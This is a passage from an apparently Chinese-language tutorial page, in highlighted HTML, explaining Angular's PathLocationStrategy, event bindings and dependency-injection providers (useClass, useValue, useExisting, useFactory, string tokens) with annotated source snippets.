          href <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">getBaseHrefFromDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
         
        <span class="token comment">// 若发现未设置基础路径，则会抛出异常。可能有一些初学者，会遇到这个问题</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>href <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">No base href set. Please provide a value for the APP_BASE_HREF 
                 token or add a base element to the document.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_baseHref <span class="token operator">=</span> href<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h3 id="pathlocationstrategy实例方法"><a href="#pathlocationstrategy实例方法" class="header-anchor">#</a> PathLocationStrategy实例方法</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">PathLocationStrategy</span> <span class="token keyword">extends</span> <span class="token class-name">LocationStrategy</span> <span class="token punctuation">{</span>
  <span class="token comment">// ...</span>
  <span class="token function">onPopState</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> LocationChangeListener<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">onPopState</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">onHashChange</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 获取基础路径</span>
  <span class="token function">getBaseHref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_baseHref<span class="token punctuation">;</span> <span class="token punctuation">}</span>

  <span class="token comment">// 基于_baseHref及internal值，生成完整的URL地址</span>
  <span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>internal<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Location<span class="token punctuation">.</span><span class="token function">joinWithSlash</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_baseHref<span class="token punctuation">,</span> internal<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 根据传递的参数值，返回path(包含或不包含hash值)的路径</span>
  <span class="token function">path</span><span class="token punctuation">(</span>includeHash<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pathname <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span>pathname <span class="token operator">+</span>
        Location<span class="token punctuation">.</span><span class="token function">normalizeQueryParams</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span>hash<span class="token punctuation">;</span>
    <span class="token keyword">return</span> hash <span class="token operator">&amp;&amp;</span> includeHash <span class="token operator">?</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>pathname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>hash<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span> <span class="token operator">:</span> pathname<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 添加会话历史状态</span>
  <span class="token function">pushState</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> url<span class="token operator">:</span> string<span class="token punctuation">,</span> queryParams<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// normalizeQueryParams()：该方法会判断queryParams是否包含'?'</span>
    <span class="token comment">// 字符，若不包含，则自动添加'?'字符。</span>
    <span class="token keyword">const</span> externalUrl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>url <span class="token operator">+</span> 
      Location<span class="token punctuation">.</span><span class="token function">normalizeQueryParams</span><span class="token punctuation">(</span>queryParams<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> externalUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 更新会话历史状态</span>
  <span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> url<span class="token operator">:</span> string<span class="token punctuation">,</span> queryParams<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> externalUrl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>url <span class="token operator">+</span>
       Location<span class="token punctuation">.</span><span class="token function">normalizeQueryParams</span><span class="token punctuation">(</span>queryParams<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> externalUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 进入会话历史记录中的下一个页面</span>
  <span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

  <span class="token comment">// 进入会话历史记录中的上一个页面</span>
  <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br></div></div><h2 id="事件"><a href="#事件" class="header-anchor">#</a> 事件</h2> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code>ngClick           <span class="token comment">//点击事件</span>
ngBlur          <span class="token comment">//失焦事件</span>
ngFocus         <span class="token comment">//获焦事件</span>
ngKeyup         <span class="token comment">//按键抬起事件</span>
ngMouseenter    <span class="token comment">//鼠标进入事件</span>
ngMouseleave     <span class="token comment">//鼠标离开事件</span>
<span class="token operator">...</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>angular的事件过滤ngKeyup有如(keyup.enter)的用法：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">#box</span> <span class="token attr-name">(keyup.enter)</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>onEnter(box.value)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>其他内容就不深究了。</p> <h2 id="ioc-di"><a href="#ioc-di" class="header-anchor">#</a> IoC/DI</h2> <p>关于依赖注入/控制反转，通常我们看到的类提供者的创建和使用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// comment.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> comments <span class="token keyword">from</span> <span class="token string">'../data/comments'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CommentService</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">getComments</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> comments<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// providers: [CommentService]</span>
<span class="token comment">// 展开写法是这样的：</span>
<span class="token comment">// providers: [{ provide: CommentService, useClass: CommentService }]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="provider接口"><a href="#provider接口" class="header-anchor">#</a> Provider接口</h3> <p>在 Angular 中我们使用 Provider 来描述与 Token 关联的依赖对象的创建方式。当我们使用 Token 向 DI 系统获取与之相关连的依赖对象时，DI 会根据已设置的创建方式，自动的创建依赖对象并返回给使用者。</p> <p><img src="/vuebloger/img/post/2994048125-58cc9e6c17087_fix732.png" alt=""></p> <p>Provider接口定义是一个具有两个属性的对象字面量:</p> <ul><li>provide属性存有令牌，它作为一个 key，在定位依赖值和配置注入器时使用;</li> <li>一个提供者定义对象，它告诉注入器要如何创建依赖值，Angular中依赖对象的创建方式有四种。 提供者定义对象中的 key可以是 useClass, 也可以是 useExisting、useValue或 useFactory共4种。</li></ul> <p>接口定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">ClassProvider</span> <span class="token punctuation">{</span>
  <span class="token comment">// 用于设置与依赖对象关联的Token值，Token值可能是Type、InjectionToken、OpaqueToken的实例或字符串</span>
  provide<span class="token operator">:</span> any<span class="token punctuation">;</span> 
  useClass<span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token comment">// 用于标识是否multiple providers，若是multiple类型，则返回与Token关联的依赖对象列表</span>
  multi<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
  
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">ValueProvider</span> <span class="token punctuation">{</span>
  provide<span class="token operator">:</span> any<span class="token punctuation">;</span>
  useValue<span class="token operator">:</span> any<span class="token punctuation">;</span>
  multi<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
  
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">ExistingProvider</span> <span class="token punctuation">{</span>
  provide<span class="token operator">:</span> any<span class="token punctuation">;</span>
  useExisting<span class="token operator">:</span> any<span class="token punctuation">;</span>
  multi<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
  
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">FactoryProvider</span> <span class="token punctuation">{</span>
  provide<span class="token operator">:</span> any<span class="token punctuation">;</span>
  useFactory<span class="token operator">:</span> Function<span class="token punctuation">;</span>
  deps<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 用于设置工厂函数的依赖对象</span>
  multi<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// TypeProvider接口</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">TypeProvider</span> <span class="token keyword">extends</span> <span class="token class-name">Type</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><h3 id="useclass"><a href="#useclass" class="header-anchor">#</a> useClass</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ApiService</span> <span class="token punctuation">{</span>
   <span class="token function">constructor</span><span class="token punctuation">(</span>
      <span class="token parameter"><span class="token keyword">public</span> http<span class="token operator">:</span> Http<span class="token punctuation">,</span> 
      <span class="token keyword">public</span> loadingCtrl<span class="token operator">:</span> LoadingController</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token punctuation">}</span>
   <span class="token operator">...</span>
<span class="token punctuation">}</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token operator">...</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
       <span class="token punctuation">{</span> provide<span class="token operator">:</span> ApiService<span class="token punctuation">,</span> useClass<span class="token operator">:</span> ApiService <span class="token punctuation">}</span> <span class="token comment">// 可使用简洁的语法，即直接使用ApiService</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CoreModule</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="usevalue"><a href="#usevalue" class="header-anchor">#</a> useValue</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token string">'API_URL'</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token string">'http://my.api.com/v1'</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="useexisting"><a href="#useexisting" class="header-anchor">#</a> useExisting</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token string">'ApiServiceAlias'</span><span class="token punctuation">,</span> useExisting<span class="token operator">:</span> ApiService <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="usefactory"><a href="#usefactory" class="header-anchor">#</a> useFactory</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">configFactory</span><span class="token punctuation">(</span><span class="token parameter">config<span class="token operator">:</span> AppConfig</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> config<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token operator">...</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
       <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">APP_INITIALIZER</span><span class="token punctuation">,</span> useFactory<span class="token operator">:</span> configFactory<span class="token punctuation">,</span> 
        deps<span class="token operator">:</span> <span class="token punctuation">[</span>AppConfig<span class="token punctuation">]</span><span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CoreModule</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="provider使用和解析"><a href="#provider使用和解析" class="header-anchor">#</a> Provider使用和解析</h3> <ol><li>创建 Token。Token 的作用是用来标识依赖对象，Token值可能是 Type、InjectionToken、OpaqueToken 类的实例或字符串。通常不推荐使用字符串，因为如果使用字符串存在命名冲突的可能性比较高。在 Angular 4.x 以前的版本我们一般使用 OpaqueToken 来创建 Token，而在 Angular 4.x 以上的版本版本，推荐使用 InjectionToken 来创建 Token 。</li> <li>根据实际需求选择依赖对象的创建方式，如 useClass 、useValue、useExisting、useFactory</li> <li>在 NgModule 或 Component 中注册 providers</li> <li>使用构造注入的方式，注入与 Token 关联的依赖对象。当DI解析 Providers 时，都会对提供的每个 provider 进行规范化处理，即转换成标准的形式。</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">_normalizeProviders</span><span class="token punctuation">(</span><span class="token parameter">providers<span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>
  providers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">b</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token keyword">instanceof</span> <span class="token class-name">Type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 支持简洁的语法，转换为标准格式</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>provide<span class="token operator">:</span> b<span class="token punctuation">,</span> useClass<span class="token operator">:</span> b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> b <span class="token operator">==</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">.</span>provide <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>b <span class="token keyword">as</span> NormalizedProvider<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">_normalizeProviders</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 如果是数组，进行递归处理</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token function">invalidProviderError</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="type类型实例化"><a href="#type类型实例化" class="header-anchor">#</a> Type类型实例化</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// Type类型 - @angular/core/src/type.ts</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> Type <span class="token operator">=</span> Function<span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">isType</span><span class="token punctuation">(</span><span class="token parameter">v<span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> v is Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">typeof</span> v <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">Type</span><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token keyword">extends</span> <span class="token class-name">Function</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>通过接口定义我们知道依赖对象的类型，就可以方便地注入对应类型的实例对象。但是有时候，我们需要注入的是普通的JavaScript对象，而不是Type 类型的对象。比如，我们需要注入一个config对象：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token constant">CONFIG</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  apiUrl<span class="token operator">:</span> <span class="token string">'http://my.api.com'</span><span class="token punctuation">,</span>
  theme<span class="token operator">:</span> <span class="token string">'suicid-squad'</span><span class="token punctuation">,</span>
  title<span class="token operator">:</span> <span class="token string">'My awesome app'</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>还有时候我们需要注入一个原始数据类型的数值，如字符串或布尔值：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token constant">FEATURE_ENABLED</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="stringtoken的问题"><a href="#stringtoken的问题" class="header-anchor">#</a> stringToken的问题</h3> <p>在这种情况下，我们是不能使用 String 或 Boolean 类型，因为如果使用这些类型，我们只能获得类型对应的默认值。想解决这个问题，但我们又不想引入一种新的类型来表示原始数据类型的值。这时我们可以考虑使用字符串作为 token，而不用引入新的类型：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> featureEnabledToken <span class="token operator">=</span> <span class="token string">'featureEnable'</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> configToken <span class="token operator">=</span> <span class="token string">'config'</span><span class="token punctuation">;</span>

providers<span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> featureEnabledToken<span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token constant">FEATURE_ENABLED</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> configToken<span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token constant">CONFIG</span> <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>使用字符串作为 token 设置完 providers 后，我们就可以使用 @Inject 装饰器注入相应依赖：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Inject <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">MyComponent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
      @<span class="token function">Inject</span><span class="token punctuation">(</span>featureEnabledToken<span class="token punctuation">)</span> <span class="token keyword">private</span> featureEnabled<span class="token punctuation">,</span>
    @<span class="token function">Inject</span><span class="token punctuation">(</span>configToken<span class="token punctuation">)</span> <span class="token keyword">private</span> config
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
